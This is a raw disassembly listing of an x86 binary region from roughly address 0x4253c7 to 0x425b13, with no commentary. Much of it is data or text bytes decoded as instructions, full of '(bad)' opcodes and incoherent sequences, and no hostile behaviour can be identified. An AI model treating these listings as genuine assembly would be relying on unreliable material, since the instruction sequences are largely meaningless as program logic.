  4253c7:	pop    ecx
  4253c8:	std    
  4253c9:	invd   
  4253cb:	cmp    BYTE PTR [eax-0x64],0xc2
  4253cf:	outs   dx,DWORD PTR ds:[esi]
  4253d0:	dec    edx
  4253d1:	xor    bh,bl
  4253d3:	ret    0xab03
  4253d6:	cmc    
  4253d7:	sbb    eax,0x8b8b8b67
  4253dc:	xchg   esi,eax
  4253dd:	jbe    0x42536a
  4253df:	mov    ecx,DWORD PTR [ecx]
  4253e1:	stc    
  4253e2:	mov    ecx,DWORD PTR [ebx+0x8b]
  4253e8:	add    BYTE PTR [eax],al
  4253ea:	add    BYTE PTR [eax],al
  4253ec:	add    BYTE PTR [eax],al
  4253ee:	inc    edx
  4253ef:	pop    ss
  4253f0:	adc    bh,BYTE PTR [esi]
  4253f2:	repz dec ebp
  4253f4:	fiadd  WORD PTR [eax]
  4253f6:	lea    eax,[ebx-0x7e]
  4253f9:	jecxz  0x425430
  4253fb:	repz clc 
  4253fd:	imul   esi,ecx,0x22
  425400:	jbe    0x425453
  425402:	inc    ebp
  425403:	pushf  
  425404:	repnz sbb eax,0xffffffff
  42540a:	(bad)  
  42540b:	(bad)  
  42540c:	(bad)  
  42540d:	(bad)  
  42540e:	inc    DWORD PTR [eax]
  425410:	add    BYTE PTR [esi+0x5b],dl
  425413:	out    dx,eax
  425414:	mov    cl,0x0
  425416:	add    dl,dl
  425418:	push   eax
  425419:	das    
  42541a:	or     bl,BYTE PTR [eax+0x792cd588]
  425420:	in     eax,0xb8
  425422:	(bad)  
  425423:	or     al,0xf1
  425425:	sbb    al,0x8c
  425427:	xchg   BYTE PTR [esi],dh
  425429:	stc    
  42542a:	into   
  42542b:	xor    al,0x39
  42542d:	fcom   st(4)
  42542f:	adc    al,0x45
  425431:	shl    edx,cl
  425433:	outs   dx,DWORD PTR ds:[esi]
  425434:	xchg   esi,eax
  425435:	mov    bl,0x49
  425437:	mov    ch,0xec
  425439:	int3   
  42543a:	add    BYTE PTR [eax],al
  42543c:	xor    eax,0xae000009
  425441:	ret    0xfd
  425444:	push   edx
  425446:	popf   
  425447:	dec    esp
  425448:	(bad)  
  425449:	or     ah,BYTE PTR [edi+0x6bba215b]
  42544f:	adc    ah,dh
  425451:	popf   
  425452:	fild   QWORD PTR [edi+ecx*2]
  425455:	enter  0x3f20,0xfc
  425459:	fldcw  WORD PTR [esp+ebp*4]
  42545c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42545d:	(bad)  
  42545e:	(bad)  
  42545f:	push   esp
  425461:	popf   
  425462:	adc    eax,0xc61fa759
  425467:	daa    
  425468:	in     al,dx
  425469:	(bad)  
  42546a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42546b:	inc    edi
  42546c:	or     dh,bh
  42546e:	aam    0xd7
  425470:	call   0xa3d5:0xf27beee9
  425477:	pop    edi
  425478:	adc    BYTE PTR [eax-0x11],bh
  42547b:	xlat   BYTE PTR ds:[ebx]
  42547c:	(bad)  
  42547e:	push   ebx
  425480:	adc    DWORD PTR [ebx-0x1],ebp
  425483:	(bad)  
  425484:	inc    DWORD PTR [eax]
	...
  42548e:	ins    DWORD PTR es:[edi],dx
  42548f:	xchg   DWORD PTR [ebx],edx
  425491:	mov    ecx,DWORD PTR [ebx-0x74747475]
  425497:	mov    ecx,DWORD PTR [ebx+0x3945458b]
  42549d:	iret   
  42549e:	dec    edi
  42549f:	or     ah,ah
  4254a1:	into   
  4254a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254a3:	mov    eax,ds:0xd5bcd525
  4254a8:	xchg   esi,eax
  4254a9:	inc    ebx
  4254aa:	cmp    BYTE PTR [edi-0x2a],ah
  4254ad:	enter  0x733a,0x4a
  4254b1:	ja     0x42550f
  4254b3:	lahf   
  4254b4:	inc    ebp
  4254b5:	inc    ebp
  4254b6:	adc    cl,BYTE PTR [ebp+0x67cf4545]
  4254bc:	inc    ebp
  4254bd:	inc    ebp
  4254be:	loope  0x425459
  4254c0:	ss jno 0x42547b
  4254c3:	(bad)  
  4254c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254c5:	mov    ecx,ds
  4254c7:	je     0x4254f9
  4254c9:	test   BYTE PTR [ebp+0x6b],bl
  4254cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254cd:	(bad)  
  4254ce:	retf   0x391b
  4254d1:	mov    ah,0x48
  4254d3:	mov    bl,0xcd
  4254d5:	jnp    0x42551c
  4254d7:	jne    0x425524
  4254d9:	ins    BYTE PTR es:[edi],dx
  4254da:	fninit 
  4254dc:	jne    0x425553
  4254de:	jne    0x4254f4
  4254e0:	shr    DWORD PTR [esi-0x60],0xdf
  4254e4:	xchg   edi,eax
  4254e5:	(bad)  
  4254e6:	sub    cl,BYTE PTR [edi+0x51f49d99]
  4254ec:	stos   BYTE PTR es:[edi],al
  4254ed:	rol    DWORD PTR [edi+0x40],0xdd
  4254f1:	inc    ecx
  4254f2:	xor    bh,dl
  4254f4:	pushf  
  4254f5:	mov    cl,0xae
  4254f7:	fbld   TBYTE PTR [ebx+ecx*8-0x2dd6f55e]
  4254fe:	fsubr  DWORD PTR [eax+0x7575f760]
  425504:	sti    
  425505:	call   0x7474:0x74757575
  42550c:	je     0x425582
  42550e:	je     0x425584
  425510:	je     0x425586
  425512:	mov    ds:0x4545ac74,eax
  425517:	inc    ebp
  425518:	inc    ebp
  425519:	inc    ebp
  42551a:	inc    ebp
  42551b:	inc    ebp
  42551c:	inc    ebp
  42551d:	inc    ebp
  42551e:	(bad)  
  42551f:	push   eax
  425521:	bound  ebp,QWORD PTR [edx+0xa]
  425524:	into   
  425525:	imul   ecx,eax,0xef130bae
  42552b:	dec    edx
  42552c:	jns    0x4254d8
  42552e:	mov    esp,0x17368d10
  425533:	fiadd  DWORD PTR [edi+0x17]
  425536:	dec    eax
  425537:	sar    bh,cl
  425539:	call   DWORD PTR [ecx+0x9]
  42553c:	call   FWORD PTR [ebx+edi*1+0x3f]
  425540:	jae    0x425576
  425542:	rcl    DWORD PTR [esp+ebp*2],cl
  425545:	scas   eax,DWORD PTR es:[edi]
  425546:	pop    ds
  425547:	add    al,0xd9
  425549:	xor    BYTE PTR [ebx+0x5d2a85f8],bl
  42554f:	and    bh,BYTE PTR [eax]
  425551:	arpl   WORD PTR [ebp+eax*2-0x12],dx
  425555:	int    0x32
  425557:	(bad)  
  425558:	(bad)  
  425559:	jnp    0x425535
  42555b:	add    bh,bh
  42555d:	call   DWORD PTR [eax+0x71]
  425560:	mov    ah,0xff
  425562:	add    BYTE PTR [edi+edx*2],dh
  425565:	pushf  
  425566:	pop    es
  425567:	xor    BYTE PTR [ecx-0x1e],dl
  42556a:	jp     0x4255a7
  42556c:	stc    
  42556d:	push   cs
  42556e:	xchg   ebx,eax
  42556f:	adc    eax,0x79b5dc29
  425574:	jg     0x4255d6
  425576:	push   edx
  425577:	in     al,0x86
  425579:	jmp    0x540:0x2d
  425580:	add    BYTE PTR [eax],al
  425582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425583:	outs   dx,BYTE PTR ds:[esi]
	...
  42558c:	add    BYTE PTR [eax],al
  42558e:	outs   dx,BYTE PTR ds:[esi]
  42558f:	push   ebx
  425590:	ds je  0x4255ee
  425593:	je     0x4255b5
  425595:	bound  esi,QWORD PTR [edx+0x6f]
  425598:	outs   dx,DWORD PTR ds:[esi]
  425599:	gs inc esi
  42559b:	cs jae 0x425607
  42559e:	popa   
  42559f:	push   edx
  4255a0:	jns    0x4255d0
  4255a2:	push   edi
  4255a3:	and    BYTE PTR [ebx+0x61],dl
  4255a6:	bound  esp,QWORD PTR [eax]
  4255a8:	and    BYTE PTR [ecx+0x61],al
  4255ab:	imul   ebp,DWORD PTR gs:[ecx+0x63],0x6f200a74
  4255b3:	and    BYTE PTR gs:[edx+0x65],dh
  4255b7:	arpl   WORD PTR gs:[eax],ax
  4255ba:	add    BYTE PTR [ebp-0x7],cl
  4255bd:	stc    
  4255be:	retf   0x1ecc
  4255c1:	pop    ds
  4255c2:	xchg   esp,eax
  4255c3:	in     al,0xb5
  4255c5:	retf   0xd009
  4255c8:	xchg   esp,eax
  4255c9:	pop    ecx
  4255ca:	mov    cl,0x7b
  4255cc:	jno    0x4255e6
  4255ce:	adc    DWORD PTR [edi+esi*2],0x74747496
  4255d5:	je     0x42564b
  4255d7:	je     0x42564d
  4255d9:	je     0x42564f
  4255db:	je     0x425568
  4255dd:	mov    ebp,esi
  4255df:	ficomp WORD PTR [edi+0x108b8bf3]
  4255e5:	jb     0x42561b
  4255e7:	imul   esi,DWORD PTR [esi+esi*1],0xffffffd4
  4255eb:	mov    bl,0x5d
  4255ed:	aas    
  4255ee:	mov    ecx,edx
  4255f0:	cwde   
  4255f1:	and    eax,0x91b18dbf
  4255f6:	xchg   ecx,eax
  4255f7:	stos   BYTE PTR es:[edi],al
  4255f8:	cmc    
  4255f9:	into   
  4255fa:	cld    
  4255fb:	sbb    al,0x65
  4255fd:	add    ebp,DWORD PTR [esi]
  4255ff:	mov    DWORD PTR [edi-0x1338d200],esi
  425605:	cmp    DWORD PTR [edx],0x3c028b8b
  42560b:	mov    ecx,DWORD PTR [ebx-0x74778987]
  425611:	add    BYTE PTR [ebx+0x557c91dd],bh
  425617:	scas   al,BYTE PTR es:[edi]
  425618:	retf   
  425619:	enter  0x6672,0xd4
  42561d:	lea    ecx,[ebp-0x24b3ebd1]
  425623:	das    
  425624:	jb     0x425606
  425626:	les    edx,FWORD PTR [edx-0x6c]
  425629:	push   edi
  42562a:	add    BYTE PTR [eax],al
  42562c:	add    dh,ah
  42562e:	frstor [esi+0x8]
  425631:	sbb    al,0x3c
  425633:	lods   al,BYTE PTR ds:[esi]
  425634:	xor    DWORD PTR [eax-0x5e],0x68815c3e
  42563b:	or     BYTE PTR [ebx-0x28ea8a8f],ch
  425641:	cs push esp
  425643:	mov    ds:0x35dae342,eax
  425648:	sbb    dh,BYTE PTR [eax]
  42564a:	add    BYTE PTR [eax],al
  42564c:	ds (bad) 
  42564e:	in     eax,dx
	...
  42565b:	retf   0x9d50
	...
  425666:	add    BYTE PTR [eax],al
  425668:	add    BYTE PTR [esi],dl
  42566a:	mov    bl,BYTE PTR [ebp+ecx*4-0x488bc139]
  425671:	nop
  425672:	jl     0x42561b
  425674:	lahf   
  425675:	int3   
  425676:	push   ds
  425677:	and    DWORD PTR [esi-0x1c],esp
  42567a:	cs or  eax,0x84e5e14
  425680:	cli    
  425681:	add    BYTE PTR [eax],al
  425683:	push   ebx
  425684:	cmc    
  425685:	add    BYTE PTR [eax],al
  425687:	pop    ecx
  425688:	aas    
  425689:	add    BYTE PTR [eax],al
  42568b:	aaa    
  42568c:	add    DWORD PTR [eax+0x41],0xe5dbd1d8
  425693:	pop    edi
  425694:	psrlq  mm4,QWORD PTR [esi+0x3f29fc96]
  42569b:	mov    ds:0xb38eb449,al
  4256a0:	jle    0x425691
  4256a2:	mov    DWORD PTR [eax],eax
  4256a4:	call   0x9bb695a5
  4256a9:	call   0x55873f96
  4256ae:	fild   QWORD PTR [ebx]
  4256b0:	jne    0x425703
  4256b2:	and    BYTE PTR [esi-0x15209fcb],dh
  4256b8:	xor    BYTE PTR [edx+0x46],0xef
  4256bc:	out    0x4c,eax
  4256be:	push   edi
  4256bf:	sub    ebp,DWORD PTR [esi]
  4256c1:	mov    cl,0x8b
  4256c3:	lea    edx,[edi+ecx*1-0x63]
  4256c7:	inc    ebx
  4256c8:	test   al,0xeb
  4256ca:	xlat   BYTE PTR ds:[ebx]
  4256cb:	xor    ebx,DWORD PTR [esi-0x1717c4b2]
  4256d1:	pop    eax
  4256d2:	shr    al,1
  4256d4:	call   0x4257c1
  4256d9:	add    BYTE PTR [eax],al
  4256db:	add    BYTE PTR [eax],al
  4256dd:	add    BYTE PTR [eax],al
  4256df:	jge    0x425721
  4256e1:	nop
	...
  4256ea:	add    BYTE PTR [eax],al
  4256ec:	add    BYTE PTR [esi],bh
  4256ee:	and    ebp,DWORD PTR [esi]
  4256f0:	and    BYTE PTR [ebp+0x70],ah
  4256f3:	outs   dx,BYTE PTR ds:[esi]
  4256f4:	and    dh,BYTE PTR [eax+0x62]
  4256f7:	ins    DWORD PTR es:[edi],dx
  4256f8:	and    BYTE PTR gs:[ebp+0x62],ch
  4256fc:	popa   
  4256fd:	gs ins DWORD PTR es:[edi],dx
  4256ff:	popa   
  425700:	imul   esp,DWORD PTR [eax],0x20637920
  425706:	cmp    al,0x5d
  425708:	ds or  eax,0x61616d43
  42570e:	ins    DWORD PTR es:[edi],dx
  42570f:	arpl   WORD PTR [eax],sp
  425711:	gs push 0x65235265
  425717:	and    BYTE PTR ds:[ebx+0x62],ah
  42571b:	jne    0x42578a
  42571d:	push   esp
  42571e:	outs   dx,DWORD PTR gs:[esi]
  425720:	or     ah,BYTE PTR [ebx+0x73]
  425723:	popa   
  425724:	je     0x42578b
  425726:	das    
  425727:	and    ah,BYTE PTR [eax]
  425729:	and    BYTE PTR [edi+0x72],ah
  42572c:	cs outs dx,DWORD PTR cs:[esi]
  42572f:	push   eax
  425730:	popa   
  425731:	push   edi
  425732:	gs or  eax,0x63616973
  425738:	ins    DWORD PTR es:[edi],dx
  425739:	cmp    al,0x65
  42573b:	or     eax,0x652c2e65
  425740:	jo     0x4257b6
  425742:	inc    esp
  425743:	cmp    dh,BYTE PTR gs:[eax+esi*2+0x65]
  425748:	das    
  425749:	gs ins BYTE PTR es:[edi],dx
  42574b:	cmp    al,0x65
  42574d:	jo     0x4257c5
  42574f:	jo     0x4257b6
  425751:	and    BYTE PTR [esi+0x20],ch
  425754:	imul   ebp,DWORD PTR [esi+0x73],0x656d5276
  42575b:	bound  esi,QWORD PTR [edx+0x3c]
  42575e:	arpl   WORD PTR [ebp+0x20],cx
  425761:	jae    0x4257cb
  425763:	push   edx
  425764:	and    esp,DWORD PTR cs:[ebp+0xa]
  425768:	ins    DWORD PTR es:[edi],dx
  425769:	and    BYTE PTR [ebx+0x68],dh
  42576c:	gs sub DWORD PTR gs:[esi],ebp
  425770:	jae    0x4257d9
  425772:	outs   dx,DWORD PTR ds:[esi]
  425773:	arpl   WORD PTR [ebp+0x70],sp
  425776:	push   ebx
  425777:	bound  ebp,QWORD PTR [ebp+0x72]
  42577a:	inc    edi
  42577b:	cs outs dx,DWORD PTR gs:[esi]
  42577e:	ins    DWORD PTR es:[edi],dx
  42577f:	jb     0x4257e6
  425781:	popa   
  425782:	ins    DWORD PTR es:[edi],dx
  425783:	cs je  0x4257a6
  425786:	arpl   WORD PTR [di+0x63],sp
  42578a:	addr16 inc ecx
  42578c:	push   edx
  42578d:	or     ah,BYTE PTR [ebp+0x65]
  425790:	popa   
  425791:	bound  edi,QWORD PTR fs:[esi]
  425794:	arpl   WORD PTR [ebp+0x20],cx
  425797:	ins    DWORD PTR es:[edi],dx
  425798:	jae    0x425810
  42579a:	jbe    0x4257be
  42579c:	outs   dx,DWORD PTR ds:[esi]
  42579d:	sub    DWORD PTR [ecx+0xd],ebp
  4257a0:	cs inc ebx
  4257a2:	jae    0x4257f7
  4257a4:	or     eax,0x74672f41
  4257a9:	push   esp
  4257aa:	jae    0x4257ce
  4257ac:	gs gs jb 0x4257ba
  4257b0:	popa   
  4257b1:	cmp    dh,BYTE PTR [edx+0x73]
  4257b4:	inc    esp
  4257b5:	je     0x42581c
  4257b7:	and    BYTE PTR [edx+eiz*2+0x75],dh
  4257bb:	ins    DWORD PTR es:[edi],dx
  4257bc:	jae    0x425821
  4257be:	gs addr16 jb 0x425836
  4257c2:	and    bh,BYTE PTR [esp+edi*1]
  4257c5:	jb     0x42582d
  4257c7:	jae    0x42582e
  4257c9:	jae    0x425830
  4257cb:	and    ah,BYTE PTR [edx]
  4257cd:	gs popa 
  4257cf:	gs gs cs inc ebx
  4257d3:	js     0x425818
  4257d5:	jae    0x42584a
  4257d7:	gs jb  0x42581f
  4257da:	gs sub DWORD PTR cs:0x23727463,ecx
  4257e2:	je     0x42580c
  4257e4:	fs jae 0x425854
  4257e7:	jne    0x425852
  4257e9:	and    BYTE PTR [eax],ah
  4257eb:	jb     0x42580d
  4257ed:	or     eax,0x6757696d
  4257f2:	outs   dx,BYTE PTR gs:[esi]
  4257f4:	jb     0x425869
  4257f6:	ins    DWORD PTR es:[edi],dx
  4257f7:	ins    BYTE PTR es:[edi],dx
  4257f8:	cs gs ins DWORD PTR es:[edi],dx
  4257fb:	or     eax,0x72636922
  425800:	ins    DWORD PTR es:[edi],dx
  425801:	and    BYTE PTR [edx],cl
  425803:	push   edi
  425804:	bound  esp,QWORD PTR [eax]
  425806:	jo     0x425836
  425808:	jae    0x425877
  42580a:	je     0x425870
  42580c:	ins    DWORD PTR es:[edi],dx
  42580d:	and    BYTE PTR [edx+0xa],dh
  425810:	jae    0x42587b
  425812:	imul   ebp,DWORD PTR [ebp+0x6d],0x2e620d3e
  425819:	bound  eax,QWORD PTR [ebx+eiz*2+0x63]
  42581d:	and    dh,BYTE PTR [esi+0x62]
  425820:	js     0x425892
  425822:	imul   esp,DWORD PTR [ebp+0x6c],0x746e6d65
  425829:	jne    0x42584d
  42582b:	imul   ecx,DWORD PTR [edx],0x61737265
  425831:	das    
  425832:	and    BYTE PTR [esi+0x70],ch
  425835:	and    BYTE PTR [eax],ah
  425837:	and    BYTE PTR [ecx+0x2e],ch
  42583a:	or     ah,BYTE PTR [ebp+0x20]
  42583d:	jb     0x4258a4
  42583f:	and    BYTE PTR [edx+0x69],dl
  425842:	ins    DWORD PTR es:[di],dx
  425844:	jae    0x4258b4
  425846:	imul   ebp,DWORD PTR [edi+0x65],0x200d6f72
  42584d:	jae    0x4258c2
  42584f:	and    BYTE PTR [ebp+0x2f],dh
  425852:	outs   dx,BYTE PTR gs:[esi]
  425854:	imul   esp,DWORD PTR [ecx+0x53],0x726d6f65
  42585b:	ins    DWORD PTR es:[edi],dx
  42585c:	je     0x42589a
  42585e:	cs inc ebx
  425860:	jb     0x4258c3
  425862:	outs   dx,BYTE PTR ds:[esi]
  425863:	outs   dx,DWORD PTR ds:[esi]
  425864:	outs   dx,BYTE PTR ds:[esi]
  425865:	arpl   WORD PTR [ecx+0x73],sp
  425868:	outs   dx,DWORD PTR ds:[esi]
  425869:	popa   
  42586a:	cmp    al,0x69
  42586c:	bound  esp,QWORD PTR [ebp+0x65]
  42586f:	ins    BYTE PTR es:[edi],dx
  425870:	fs cs push esi
  425873:	inc    ecx
  425874:	ins    DWORD PTR es:[edi],dx
  425875:	jae    0x4258e4
  425877:	jns    0x4258ef
  425879:	jo     0x4258e3
  42587b:	and    BYTE PTR gs:[eax+0x74],bh
  42587f:	je     0x4258ee
  425881:	je     0x4258a3
  425883:	dec    ebp
  425884:	dec    ebp
  425885:	and    BYTE PTR [eax],ah
  425887:	and    BYTE PTR [eax],ah
  425889:	jbe    0x4258ab
  42588b:	bound  esp,QWORD PTR [ebp+0x20]
  42588e:	and    BYTE PTR [ecx+eiz*2+0x72],ch
  425892:	jb     0x4258e7
  425894:	bound  ebp,QWORD PTR [ecx+0x65]
  425897:	outs   dx,DWORD PTR ds:[esi]
  425898:	and    BYTE PTR [ebp+0x2e],ah
  42589b:	outs   dx,DWORD PTR ds:[esi]
  42589c:	das    
  42589d:	gs jne 0x4258ce
  4258a0:	gs gs jo 0x425916
  4258a4:	outs   dx,DWORD PTR ds:[esi]
  4258a5:	outs   dx,BYTE PTR ds:[esi]
  4258a6:	gs or  eax,0x72526567
  4258ac:	dec    ebp
  4258ad:	popa   
  4258ae:	jae    0x425929
  4258b0:	arpl   WORD PTR [ebx+0x53],dx
  4258b3:	jb     0x4258d5
  4258b5:	ins    DWORD PTR es:[edi],dx
  4258b6:	ins    DWORD PTR es:[edi],dx
  4258b7:	je     0x4258c3
  4258b9:	gs ins BYTE PTR es:[edi],dx
  4258bb:	ds push ebx
  4258bd:	jb     0x4258df
  4258bf:	or     ah,BYTE PTR [ebp+0x20]
  4258c2:	bound  ebp,QWORD PTR [ecx+0x79]
  4258c5:	gs popa 
  4258c7:	jo     0x4258d3
  4258c9:	jb     0x425939
  4258cb:	addr16 gs push esp
  4258ce:	cmp    al,0x61
  4258d0:	sub    al,0x72
  4258d2:	jae    0x425941
  4258d4:	outs   dx,DWORD PTR ds:[esi]
  4258d5:	aas    
  4258d6:	outs   dx,DWORD PTR ds:[esi]
  4258d7:	cs cmp al,0x65
  4258da:	cmp    dh,BYTE PTR [ebx+0x41]
  4258dd:	and    BYTE PTR [edx],cl
  4258df:	je     0x42590f
  4258e1:	cs push edi
  4258e3:	and    ah,BYTE PTR [eax]
  4258e5:	jb     0x42595a
  4258e7:	bound  esp,QWORD PTR [edx+0x44]
  4258ea:	cmp    ch,BYTE PTR [edi+0x22]
  4258ed:	and    ch,BYTE PTR cs:[ecx+0x53]
  4258f1:	imul   esp,DWORD PTR gs:[edx+0x3c],0x4d6f7279
  4258f9:	arpl   WORD PTR [ebx+0x6f],si
  4258fc:	inc    esp
  4258fd:	cs inc esp
  4258ff:	cmp    al,0x52
  425901:	popa   
  425902:	gs gs push ebx
  425905:	ins    DWORD PTR es:[edi],dx
  425906:	jb     0x42596d
  425908:	and    ebp,DWORD PTR [ecx+0x6e]
  42590b:	jae    0x42597b
  42590d:	je     0x425985
  42590f:	dec    ebp
  425910:	bound  ecx,QWORD PTR ds:[ebp+0x20]
  425914:	and    BYTE PTR [ebx],ah
  425916:	or     eax,0x69206572
  42591b:	and    BYTE PTR [eax+0x62],dh
  42591e:	gs gs jo 0x425995
  425922:	ins    DWORD PTR es:[edi],dx
  425923:	jbe    0x425995
  425925:	and    BYTE PTR [esi+0x6f],dh
  425928:	jae    0x42599c
  42592a:	push   edi
  42592b:	bound  esi,QWORD PTR [edx+0x73]
  42592e:	jo     0x42597d
  425930:	outs   dx,DWORD PTR ds:[esi]
  425931:	jae    0x4259a5
  425933:	jo     0x4259a7
  425935:	jo     0x4259a9
  425937:	push   edi
  425938:	jae    0x42599c
  42593a:	gs gs gs jae 0x4259ab
  42593f:	ins    DWORD PTR es:[edi],dx
  425940:	ins    DWORD PTR es:[edi],dx
  425941:	gs or  eax,0x63706d65
  425947:	cmp    al,0x53
  425949:	ins    DWORD PTR es:[edi],dx
  42594a:	sub    al,0x67
  42594c:	ja     0x425976
  42594e:	jbe    0x4259c2
  425950:	je     0x4259a5
  425952:	jae    0x4259b8
  425954:	and    cl,BYTE PTR [ebp+0x44]
  425957:	ins    BYTE PTR es:[edi],dx
  425958:	ins    DWORD PTR es:[edi],dx
  425959:	arpl   WORD PTR [ecx],bp
  42595b:	ins    DWORD PTR es:[edi],dx
  42595c:	jbe    0x4259a3
  42595e:	and    BYTE PTR [esi],bh
  425960:	cs ins DWORD PTR es:[edi],dx
  425962:	jbe    0x4259b1
  425964:	ds push esp
  425966:	gs gs popa 
  425969:	bound  ecx,QWORD PTR cs:[ebp+0x65]
  42596d:	gs gs cmp eax,0x622e6575
  425974:	ja     0x4259e6
  425976:	push   esp
  425977:	arpl   WORD PTR ds:0x72656d20,di
  42597d:	imul   edx,DWORD PTR [edx+0x28],0x656f730a
  425984:	inc    ecx
  425985:	and    BYTE PTR [eax],ah
  425987:	bound  edi,QWORD PTR [ecx+ebp*2]
  42598a:	gs jbe 0x4259f2
  42598d:	and    ebp,DWORD PTR [esi+0x20]
  425990:	je     0x4259d3
  425992:	push   ebx
  425993:	and    BYTE PTR [esi],ch
  425995:	bound  esp,QWORD PTR [ebx+0x52]
  425998:	imul   esp,DWORD PTR [ebp+0x72],0x73672270
  42599f:	jb     0x425a0f
  4259a1:	dec    ebp
  4259a2:	and    BYTE PTR [edi+0x73],ch
  4259a5:	jae    0x425a1a
  4259a7:	gs or  eax,0x6f416e2e
  4259ad:	gs gs jo 0x425a16
  4259b1:	imul   esi,DWORD PTR [edx+ecx*1+0x6d],0x2e792e65
  4259b9:	jbe    0x425a28
  4259bb:	and    BYTE PTR [ebx+0x20],dh
  4259be:	gs jae 0x425a27
  4259c1:	outs   dx,BYTE PTR ds:[esi]
  4259c2:	or     ch,BYTE PTR [ecx+0x65]
  4259c5:	jb     0x425a01
  4259c7:	outs   dx,DWORD PTR ds:[esi]
  4259c8:	or     eax,0x76775753
  4259cd:	outs   dx,BYTE PTR ds:[esi]
  4259ce:	outs   dx,BYTE PTR ds:[esi]
  4259cf:	inc    esp
  4259d0:	or     eax,0x6122696e
  4259d5:	popa   
  4259d6:	and    BYTE PTR [edx],bh
  4259d8:	cs cmp al,0x2e
  4259db:	gs jae 0x425a50
  4259de:	fs imul ebp,DWORD PTR gs:[ecx],0x20726d3d
  4259e6:	and    BYTE PTR [ecx+0x53],ch
  4259e9:	cmp    al,0x62
  4259eb:	push   ebx
  4259ec:	arpl   WORD PTR [eax],sp
  4259ee:	dec    ebp
  4259ef:	arpl   WORD PTR [eax+0x73],di
  4259f2:	outs   dx,BYTE PTR ds:[esi]
  4259f3:	push   edi
  4259f4:	and    BYTE PTR [edx+0x65],dh
  4259f7:	bound  sp,DWORD PTR cs:[ebx+0x74]
  4259fc:	jb     0x425a67
  4259fe:	arpl   WORD PTR ds:0x69797272,cx
  425a04:	outs   dx,BYTE PTR ds:[esi]
  425a05:	jne    0x425a77
  425a07:	gs dec esp
  425a09:	jo     0x425a34
  425a0b:	inc    ebx
  425a0c:	dec    ebp
  425a0d:	arpl   WORD PTR gs:[ecx],bp
  425a10:	outs   dx,BYTE PTR cs:[esi]
  425a12:	bound  esi,QWORD PTR [edx+0x50]
  425a15:	outs   dx,BYTE PTR ds:[esi]
  425a16:	popa   
  425a17:	arpl   WORD PTR [ebx+0xa],dx
  425a1a:	ins    DWORD PTR es:[edi],dx
  425a1b:	dec    ebp
  425a1c:	gs cs jbe 0x425a87
  425a20:	cs push edx
  425a22:	ins    DWORD PTR es:[edi],dx
  425a23:	imul   esp,DWORD PTR [eax],0x79722020
  425a29:	outs   dx,DWORD PTR ds:[esi]
  425a2a:	and    BYTE PTR [ebx+0x2e],dh
  425a2d:	push   ebx
  425a2e:	jb     0x425a92
  425a30:	imul   esp,DWORD PTR [ebp+0x6d],0x692e6d20
  425a37:	gs je  0x425aad
  425a3a:	or     dh,BYTE PTR gs:[edx+0x6e]
  425a3e:	outs   dx,DWORD PTR ds:[esi]
  425a3f:	ins    DWORD PTR es:[edi],dx
  425a40:	and    BYTE PTR gs:[ecx+0x20],ch
  425a44:	inc    ecx
  425a45:	ins    DWORD PTR es:[edi],dx
  425a46:	cmp    al,0x2e
  425a48:	and    BYTE PTR [ebx+0x65],ah
  425a4b:	cmp    al,0x3e
  425a4d:	gs gs fs gs gs jae 0x425ab9
  425a54:	push   edx
  425a55:	and    BYTE PTR gs:[ebp+ebp*2+0x2e],dh
  425a5a:	and    BYTE PTR [edx+esi*2+0x22],al
  425a5e:	arpl   WORD PTR [edi+0x6d],dx
  425a61:	je     0x425a83
  425a63:	imul   esi,DWORD PTR [ebx+0x74],0x4d207220
  425a6a:	gs bound ebp,QWORD PTR fs:[ecx+0x65]
  425a6f:	gs push edi
  425a71:	gs cmp eax,0x29646d6f
  425a77:	inc    ecx
  425a78:	jne    0x425abf
  425a7a:	push   ebx
  425a7b:	or     eax,0x2e616565
  425a80:	je     0x425ae3
  425a82:	jb     0x425aeb
  425a84:	and    BYTE PTR ds:0x736e653e,cl
  425a8a:	outs   dx,DWORD PTR ds:[esi]
  425a8b:	and    BYTE PTR [ebx+0x20],ah
  425a8e:	or     ah,BYTE PTR cs:[eax]
  425a91:	or     bh,BYTE PTR [esi]
  425a93:	gs je  0x425b02
  425a96:	dec    ebp
  425a97:	gs cs push ebx
  425a9a:	jo     0x425ac4
  425a9c:	cs ins BYTE PTR es:[edi],dx
  425a9e:	and    BYTE PTR [eax],ch
  425aa0:	outs   dx,DWORD PTR ds:[esi]
  425aa1:	outs   dx,BYTE PTR gs:[esi]
  425aa3:	and    BYTE PTR gs:0x52656e76,cl
  425aaa:	arpl   WORD PTR [ebp+0x73],sp
  425aad:	ds ins DWORD PTR es:[edi],dx
  425aaf:	arpl   WORD PTR [edi+0x6e],bp
  425ab2:	ins    DWORD PTR es:[edi],dx
  425ab3:	and    BYTE PTR [ebp+0x73],dh
  425ab6:	jb     0x425b1d
  425ab8:	jae    0x425af8
  425aba:	jae    0x425b20
  425abc:	jb     0x425b23
  425abe:	cmp    bh,BYTE PTR [ecx+0x2e]
  425ac1:	gs jo  0x425b08
  425ac4:	sub    DWORD PTR [eax+eiz*1+0x65],esi
  425ac8:	addr16 inc ecx
  425aca:	or     al,BYTE PTR [ebx+0x57]
  425acd:	jo     0x425b22
  425acf:	or     eax,0x6d6f7265
  425ad4:	outs   dx,BYTE PTR ds:[esi]
  425ad5:	inc    esp
  425ad6:	jb     0x425b41
  425ad8:	and    BYTE PTR [ebx+esi*2],ch
  425adb:	imul   esp,DWORD PTR [ebp+0x6f],0x573d203c
  425ae2:	gs cs jae 0x425b5f
  425ae6:	jae    0x425b08
  425ae8:	inc    esp
  425ae9:	je     0x425b50
  425aeb:	bound  edx,QWORD PTR [ebx+0x74]
  425aee:	imul   eax,DWORD PTR [esp+edi*1+0x6f],0x70616d61
  425af6:	and    BYTE PTR [ebx+0x41],ah
  425af9:	and    ah,BYTE PTR [ebp+0x76]
  425afc:	jns    0x425b61
  425afe:	jb     0x425b72
  425b00:	inc    ebx
  425b01:	xor    BYTE PTR [ebp+0x76],ah
  425b04:	dec    ebp
  425b05:	sub    DWORD PTR [esi+ebp*1+0x77],esi
  425b09:	cs gs gs cs ins DWORD PTR es:[edi],dx
  425b0e:	jb     0x425b54
  425b10:	das    
  425b11:	addr16 das 
  425b13:	dec    ebp
